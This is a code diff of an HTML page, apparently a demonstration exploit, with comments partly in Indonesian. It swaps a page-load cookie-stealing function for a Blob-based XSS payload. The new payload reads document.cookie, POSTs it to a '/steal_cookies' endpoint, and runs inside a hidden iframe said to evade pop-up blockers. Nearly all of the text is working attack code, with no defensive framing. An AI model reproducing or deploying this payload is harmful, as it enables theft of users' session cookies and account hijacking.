@@ -19,27 +19,39 @@
     </form>
 
     <script>
-        // Function to steal cookies and send to attacker's server
-        function stealCookies() {
-            // Get cookies from document.cookie
-            const cookies = document.cookie;
+        // Blob content with XSS vulnerability
+        const blobContent = `
+            <html>
+            <head>
+                <meta charset="UTF-8">
+            </head>
+            <body>
+                <h1>Blob XSS Attack</h1>
+                <script>
+                    // Mengambil cookies korban dan mengirimnya ke server penyerang
+                    const cookies = document.cookie;
+                    const xhr = new XMLHttpRequest();
+                    xhr.open("POST", "http://localhost:3000/steal_cookies", true);
+                    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+                    xhr.send("cookies=" + encodeURIComponent(cookies));
+                <\/script>
+            </body>
+            </html>
+        `;
 
-            // Check if cookies exist
-            if (cookies) {
-                // Send cookies to attacker
-                const xhr = new XMLHttpRequest();
-                xhr.open("POST", "http://localhost:3000/steal_cookies", true);  // Ubah URL dengan server penyerang
-                xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-                xhr.send("cookies=" + encodeURIComponent(cookies));
+        // Create Blob and open it in an iframe
+        const blob = new Blob([blobContent], { type: "text/html;charset=utf-8" });
+        const url = URL.createObjectURL(blob);
 
-                console.log("Cookies sent:", cookies);
-            } else {
-                console.log("No cookies found.");
-            }
-        }
+        // Open Blob in hidden iframe to bypass pop-up blocker
+        const iframe = document.createElement('iframe');
+        iframe.style.display = 'none';
+        iframe.src = url;
+        document.body.appendChild(iframe);
 
-        // Trigger XSS on page load (simulates malicious behavior)
-        window.onload = stealCookies;
+        setTimeout(() => {
+            document.body.removeChild(iframe);
+        }, 5000);
     </script>
 </body>
 </html>
